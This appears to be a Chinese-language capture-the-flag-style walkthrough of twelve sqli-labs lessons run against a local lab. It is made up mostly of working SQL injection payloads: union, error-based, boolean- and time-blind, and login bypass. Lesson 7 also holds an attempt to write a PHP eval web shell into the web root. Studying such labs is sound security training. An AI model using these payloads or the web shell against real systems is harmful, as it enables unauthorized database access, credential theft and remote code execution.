
## Page 1

### Lesson 1

随手加个单引号试试：
```
http://localhost:81/Less-1/?id=-1'
```

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1
```

注意观察 -1 后面有两个单引号，去掉我们自己加的一个，说明变量是用一个单引号包裹的

那么直接构造就好了
```
http://localhost:81/Less-1/?id=-1' union select 1, user(), '3
```

### Lesson 2

同样的思路
```
http://localhost:81/Less-2/?id=-1 union select 1, user(), 3
```

### Lesson 3

```
http://localhost:81/Less-3/?id=-1') union select 1, user(), ('2
```

### Lesson 4

```
http://localhost:81/Less-4/?id=-1") union select 1, user(), ("2
```

### Lesson 5

报错注入：
```
http://localhost:81/Less-5/?id=-1' union select updatexml(1, concat(0x7e, (select user()), 0x7e), 1), 2, '3
```

### Lesson 6

```
http://localhost:81/Less-6/?id=1" union select updatexml(1, concat(0x7e, (select user()), 0x7e), 1), 2, "3
```

### Lesson 7

```
http://localhost:81/Less-7/?id=1')) union select 1, 2, "<?php eval($_GET['x']) ?>" into outfile '/var/www/html/shell.php' --+
```

写入权限不足，可能是因为 docker 打包导致的？

### Lesson 8

构造布尔表达式
```
http://localhost:81/Less-8/?id=1' and (select database() = 'security') and '1'='1
```

### Lesson 9

构造布尔表达式，基于时间的盲注
```
http://localhost:81/Less-9/?id=1' and substr((select database()), 1, 1) = 's' and sleep(3) and '1'='1
```

### Lesson 10

```
http://localhost:81/Less-10/?id=1" and substr((select database()), 1, 1) = 's' and sleep(3) and "1" = "1
```

### Lesson 11

```
passwd=admin' or '1'='1&submit=Submit&uname=admin
```

```
passwd=none' union select database(), '2&submit=Submit&uname=admin
```

### Lesson 12

```
passwd=none") or 1=("1&submit=Submit&uname=admin
```

```
passwd=none") union select database(), ("2&submit=Submit&uname=admin
```
